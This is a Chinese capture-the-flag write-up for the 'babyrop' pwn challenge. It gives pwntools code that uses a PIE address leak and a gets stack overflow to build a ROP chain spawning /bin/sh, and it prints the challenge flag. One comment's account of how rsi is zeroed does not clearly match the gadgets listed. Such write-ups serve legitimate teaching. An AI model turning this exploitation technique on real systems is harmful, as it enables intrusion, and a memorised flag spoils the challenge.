# babyrop

## 题目简述

64 位 ELF 开启 NX、PIE 和 Full RELRO，但没有栈 canary。程序在隐藏菜单项中泄露 PIE 内字符串地址，又在 `vulnerable_function` 中用 `gets` 读入 69 字节栈缓冲区，因此可以先确定加载基址，再使用程序自带 gadget 执行 `execve("/bin/sh", 0, 0)`。

## 解题过程

菜单把整数 `0xdeadbeef` 交给 `say_something_cool`，后者打印全局指针 `text` 指向的字符串地址。该字符串在文件中的偏移为 `0x205c`，所以：

```python
io.sendlineafter(b"Choice: ", str(0xdeadbeef).encode())
io.recvuntil(b"My cool text: 0x")
leak = int(io.recvline().strip(), 16)
base = leak - 0x205c
```

`gets` 覆盖返回地址的偏移为 `0x58`。程序故意提供了 `pop rax; ret`、`pop rdi; ret`、`mov rdi, rsi; ret` 和 `syscall; ret`，而字符串中的 `/bin/sh` 位于 PIE 偏移 `0x2070`。核心 ROP 链为：

```python
from pwn import flat

payload = b"A" * 0x58 + flat(
    base + 0x1347, 0,             # pop rdi; ret
    base + 0x1354,                # mov rdi, rsi; ret
    base + 0x1347, base + 0x2070, # rdi = "/bin/sh"
    base + 0x133a, 59,            # rax = SYS_execve
    base + 0x1363,                # syscall; ret
)

io.sendlineafter(b"Choice: ", b"1")
io.sendlineafter(b"Enter your input: ", payload)
```

第一组 gadget 先令 `rsi = 0`，运行时 `rdx` 也满足空指针约束；随后系统调用号 59 启动 shell。本地以随附服务二进制执行该链并读取 `flag.txt`，得到 `grey{w3lL_d0NE_r0P_pr0o0!!!<3}`。

## 方法总结

PIE 不会阻止利用已泄露的模块内地址：先减去静态偏移得到基址，再给所有 gadget 和字符串地址加基址即可。本题还展示了只用目标程序自带短 gadget 构造系统调用的基本方法。最终 flag 为 `grey{w3lL_d0NE_r0P_pr0o0!!!<3}`。
